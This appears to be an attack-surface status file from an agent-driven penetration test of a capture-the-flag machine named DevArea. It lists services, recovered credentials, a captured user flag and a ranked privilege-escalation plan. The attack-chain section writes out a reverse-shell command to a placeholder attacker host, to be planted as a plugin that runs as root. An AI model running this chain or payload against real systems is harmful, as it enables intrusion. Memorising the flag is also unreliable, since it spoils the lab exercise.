# Attack Surface — DevArea
> Last updated: 2026-03-28T19:32Z
> Operation status: POST-ACCESS — PRIVESC READY

## Service Inventory
| Port | Service | Version | Confidence | Notes |
|------|---------|---------|------------|-------|
| 21 | FTP | vsftpd 3.0.5 | HIGH | Anonymous login. `pub/employee-service.jar` (6.4MB) |
| 22 | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 | HIGH | dev_ryan access via injected ed25519 key |
| 80 | HTTP | Apache 2.4.58 (Ubuntu) | HIGH | Static site "DevArea". Redirects to devarea.htb |
| 8080 | HTTP | Jetty 9.4.27.v20200227 | HIGH | Apache CXF 3.2.14 SOAP service. Aegis databinding. /employeeservice |
| 8500 | HTTP Proxy | Golang net/http | HIGH | Hoverfly proxy port |
| 8888 | HTTP | Golang net/http (Hoverfly) | HIGH | Hoverfly Admin Dashboard. Auth enabled. |
| 7777 | HTTP | Werkzeug/3.1.4 Python/3.12.3 | HIGH | ★ SysWatch Web GUI (Flask). Localhost only. Login required. |

## Users
- **dev_ryan** (uid 1001) — `/home/dev_ryan`, bash shell. Runs Hoverfly and employee-service. Has sudo NOPASSWD on syswatch.sh.
- **syswatch** (uid 984) — `/opt/syswatch`, nologin. Runs SysWatch web GUI and monitor. Owns /opt/syswatch/.
- **_laurel** (uid 999) — audit log processor.

## Current Access
- **User:** dev_ryan via SSH (ed25519 key)
- **User flag:** cf14fc7f8e42b5af1e89009ce551f258

## Attack Paths — Privilege Escalation
| Rank | Path | Confidence | Complexity | Status | Evidence |
|------|------|------------|------------|--------|----------|
| 1 | Flask session forgery → SysWatch command injection → plugin write → root via monitor.sh | HIGH | Standard | OPEN | Flask secret key recovered, command injection in service_status (shell=True), monitor.sh executes plugins/*.sh as root every 5 min |
| 2 | sudo syswatch.sh plugin injection — find writable subcommand to plant malicious plugin | HIGH | Standard | OPEN | sudo NOPASSWD confirmed, plugin regex validation present but may have bypass |
| 3 | Direct SysWatch web login → command injection → root | MEDIUM | Standard | OPEN | Admin password from env file didn't work on login — may be hashed differently or changed |

## Exploit Research — Privesc

### SysWatch Architecture (from syswatch-v1.zip in dev_ryan's home)
- `/opt/syswatch/syswatch.sh` — main management script (6.1KB)
  - Subcommands: plugins, logs, web-status, plugin, start/stop web
  - Input validation: `SAFE_PLUGIN_REGEX='^[a-zA-Z0-9_.\-$]+$'`, `SAFE_LOG_REGEX='^[A-Za-z0-9_.-]+$'`
  - **dev_ryan has sudo NOPASSWD** on this script
- `/opt/syswatch/monitor.sh` — ★ **executes all plugins/*.sh as root** (every 5 min via systemd timer)
- `/opt/syswatch/syswatch_gui/app.py` — Flask web GUI on localhost:7777
  - Secret key from env: `SYSWATCH_SECRET_KEY` (recovered by NOIRE, stored in memoria)
  - `service_status` endpoint uses `subprocess` with `shell=True` and weak regex validation
  - **Command injection primitive** in service name parameter
- `/opt/syswatch/plugins/` — plugin scripts (cpu_mem, disk, network, log, service monitors)
- `/opt/syswatch/config/syswatch.conf` — config with thresholds, service list, paths

### Vulnerability Primitive — SysWatch Web GUI Command Injection
- **Primitive:** User-controlled service name passed to subprocess with shell=True
- **Delivery forms:**
  - Inject shell metacharacters into service name parameter
  - Bypass weak regex filter (exact pattern needs testing)
  - Newline injection, command substitution, pipe injection
- **Defenses observed:** Regex filter on service name (weak — pattern in source code). Flask session auth required.
- **Untested forms:** All — no exploitation attempted yet
- **Shell context:** syswatch (uid 984) — can write to /opt/syswatch/plugins/

### Vulnerability Primitive — monitor.sh Plugin Execution
- **Primitive:** Any .sh file in /opt/syswatch/plugins/ is executed as root by monitor.sh
- **Delivery:** Write malicious .sh file to plugins directory (requires syswatch user or root)
- **Defenses observed:** Only skips common.sh. No integrity checks, no whitelisting.
- **Timer:** Every 5 minutes — wait or trigger manually if possible

### Attack Chain (Recommended)
```
1. Forge Flask session using recovered secret key → authenticate to SysWatch GUI
2. Command injection via service_status endpoint → code execution as syswatch
3. Write malicious plugin: echo 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /opt/syswatch/plugins/evil.sh
4. Wait for monitor.sh timer (≤5 min) → root shell
   OR: sudo /opt/syswatch/syswatch.sh with appropriate subcommand to trigger monitor
```

## Credentials Vault Summary
| # | Type | Username | Context | Verified |
|---|------|----------|---------|----------|
| 1 | password | admin | Hoverfly API (port 8888) | YES |
| 2 | token | admin | Hoverfly JWT (expires 2036) | YES |
| 3 | ssh_key | dev_ryan | SSH access | YES |
| 4 | password | admin | SysWatch Web GUI | NO (login failed) |
| 5 | api_key | syswatch | Flask secret key for session forging | NO (untested) |

## Anomalies
- SysWatch admin password from env file rejected by login form — hash mismatch or password was changed after init
- ACL explicitly blocks dev_ryan from /opt/syswatch — but zip copy in home dir contains full source
- _laurel audit logging active

## Gaps
- Exact regex pattern for service_status command injection needs testing
- syswatch.sh full subcommand analysis (NOIRE had source but may not have enumerated all paths)
- Whether sudo syswatch.sh can trigger monitor.sh directly

## Decision Log
| Timestamp | Decision | Rationale | Outcome |
|-----------|----------|-----------|---------|
| 19:05Z | Full TCP scan | Standard Phase 1 | 6 services identified |
| 19:07Z | Download JAR from FTP | Reveal app internals | CXF 3.2.14 + Aegis |
| 19:13Z | Test CXF SSRF | Validate CVE-2024-28752 | File read confirmed |
| 19:14Z | Read systemd units | Find credentials | Hoverfly admin creds |
| 19:16Z | Deploy ELLIOT for Hoverfly RCE | HIGH confidence trivial path | Shell as dev_ryan, 3 turns |
| 19:24Z | Deploy ELLIOT for SSH key injection | Stable shell for NOIRE | SSH access established |
| 19:26Z | Deploy NOIRE for post-access enum | Need privesc leads | 3 critical leads from syswatch |
| 19:32Z | Preparing ELLIOT privesc handoff | Flask session forge → cmd injection → plugin write → root | Awaiting operator confirmation |

## Session Log
| Session | Phase | Key findings | Next move confirmed |
|---------|-------|-------------|---------------------|
| 1 | Recon → Foothold | CXF SSRF, Hoverfly RCE, user flag | ELLIOT deployed — success |
| 1 | Post-access | SysWatch: sudo NOPASSWD, Flask cmd injection, plugin root exec | Awaiting operator for privesc |
